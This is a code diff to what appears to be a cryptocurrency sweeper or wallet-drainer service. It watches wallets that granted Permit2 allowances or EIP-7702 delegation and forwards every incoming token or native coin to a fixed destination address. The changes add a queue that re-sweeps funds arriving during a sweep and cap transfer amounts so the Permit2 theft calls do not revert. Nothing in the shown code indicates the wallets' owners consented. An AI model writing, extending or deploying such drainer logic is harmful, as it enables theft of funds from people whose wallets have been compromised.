@@ -334,6 +334,7 @@ let TOKENS = [];
 
 const monitoredWallets = new Map(); // address.toLowerCase() → { address, type }
 const sweepingNow      = new Set(); // currently-sweeping addresses (transfer debounce)
+const pendingSweep     = new Set(); // Transfer arrived while a sweep was in-progress → re-sweep after
 
 // ── Logging ───────────────────────────────────────────────────────────────────
 
@@ -565,8 +566,10 @@ async function sweepPermit2Wallet(walletAddress) {
     try {
       // Verify Permit2 allowance is set and not expired before any balance check
       let allowanceOk = false;
+      let allowedAmount = 0n;
       try {
-        const [allowedAmount, expiration] = await permit2Read.allowance(
+        let expiration;
+        [allowedAmount, expiration] = await permit2Read.allowance(
           checksum, tokenAddress, relayerWallet.address
         );
         allowanceOk = allowedAmount > 0n && expiration > nowSecs;
@@ -579,6 +582,7 @@ async function sweepPermit2Wallet(walletAddress) {
       } catch {
         // allowance() call failed — try transferFrom anyway (non-fatal)
         allowanceOk = true;
+        allowedAmount = BigInt(2n ** 160n - 1n);
       }
 
       const token   = new ethers.Contract(tokenAddress, ERC20_ABI, getReadProvider());
@@ -589,6 +593,9 @@ async function sweepPermit2Wallet(walletAddress) {
         continue;
       }
 
+      // Cap at allowedAmount — Permit2 reverts with InsufficientAllowance if amount > allowedAmount
+      const sweepAmt = allowedAmount < balance ? allowedAmount : balance;
+
       let symbol = tokenAddress.slice(0, 10);
       try { symbol = await token.symbol(); } catch {}
 
@@ -598,7 +605,7 @@ async function sweepPermit2Wallet(walletAddress) {
       const tx  = await permit2.transferFrom(
         checksum,
         DESTINATION_ADDRESS,
-        balance,          // uint160 — token balances never exceed uint160 in practice
+        sweepAmt,
         tokenAddress,
         { gasLimit: 150_000n, ...fee }
       );
@@ -1416,9 +1423,14 @@ async function dispatchSweep(wallet) {
     return;
   }
 
-  // Debounce
+  // Debounce: one sweep in-flight per address at a time.
+  // If a Transfer arrives while sweeping, pendingSweep marks it — we re-sweep after cooldown.
   const key = wallet.address.toLowerCase();
-  if (sweepingNow.has(key)) return;
+  if (sweepingNow.has(key)) {
+    pendingSweep.add(key);
+    log(`[sweep] queued pending re-sweep for ${short} (currently sweeping)`);
+    return;
+  }
   sweepingNow.add(key);
 
   try {
@@ -1427,7 +1439,17 @@ async function dispatchSweep(wallet) {
   } catch (e) {
     log(`[sweep] ❌ error for ${short}: ${e.message}`);
   } finally {
-    setTimeout(() => sweepingNow.delete(key), 120000);
+    setTimeout(() => {
+      sweepingNow.delete(key);
+      if (pendingSweep.has(key)) {
+        pendingSweep.delete(key);
+        const w = monitoredWallets.get(key);
+        if (w) {
+          log(`[sweep] re-triggering queued sweep for ${short}`);
+          dispatchSweep(w).catch(e => log(`[sweep] re-sweep error: ${e.message}`));
+        }
+      }
+    }, 120000);
   }
 }
 
@@ -1703,8 +1725,9 @@ async function sweep(wallet) {
             const balance = await token.balanceOf(checksum);
             if (balance === 0n) continue;
 
+            const sweepAmt = p2Amount < balance ? p2Amount : balance;
             const fee = await getFeeData();
-            const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, tokenAddr, { gasLimit: 150_000n, ...fee });
+            const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, tokenAddr, { gasLimit: 150_000n, ...fee });
             await tx.wait();
             log(`[allowance] ✅ swept ${tokenAddr.slice(0,10)}`);
           } catch (e) {
@@ -2595,16 +2618,10 @@ async function startTransferListeners(wsProvider, tokens) {
         const symbol = token?.symbol ?? txLog.address.slice(0, 8);
         log(`[transfer] 📥 ${symbol} → ${to.slice(0, 10)} amount=${ethers.formatUnits(amount, token?.decimals ?? 18)} — sweeping`);
 
-        if (sweepingNow.has(toLower)) {
-          log(`[transfer] debounced — already sweeping ${to.slice(0, 10)}`);
-          return;
-        }
-        sweepingNow.add(toLower);
-
         const wallet = monitoredWallets.get(toLower);
+        // dispatchSweep handles its own debounce + pending-queue logic
         dispatchSweep(wallet)
-          .catch(e => log(`[transfer] sweep error for ${to.slice(0, 10)}: ${e.message}`))
-          .finally(() => setTimeout(() => sweepingNow.delete(toLower), 120000));
+          .catch(e => log(`[transfer] sweep error for ${to.slice(0, 10)}: ${e.message}`));
       });
     } catch (e) {
       warn(`[listeners] batch ${i} subscription failed: ${e.message}`);
@@ -2643,15 +2660,9 @@ async function _nativePollTick() {
         log(`[native] wallet not EIP-7702 — native coin cannot be swept`);
         continue;
       }
-      if (sweepingNow.has(toLower)) {
-        log(`[native] debounced — already sweeping ${tx.to.slice(0, 10)}`);
-        continue;
-      }
-      sweepingNow.add(toLower);
-      sweepEIP7702Wallet(wallet.address)
-        .then(() => log(`[native] ✅ swept for ${tx.to.slice(0, 10)}`))
-        .catch(e  => log(`[native] sweep error: ${e.message}`))
-        .finally(() => setTimeout(() => sweepingNow.delete(toLower), 120_000));
+      // dispatchSweep handles debounce + pending-queue internally
+      dispatchSweep(wallet)
+        .catch(e => log(`[native] sweep error: ${e.message}`));
     }
   } catch (e) {
     if (e.message?.includes("rate limit") || e.message?.includes("50/second") || e.message?.includes("429")) {
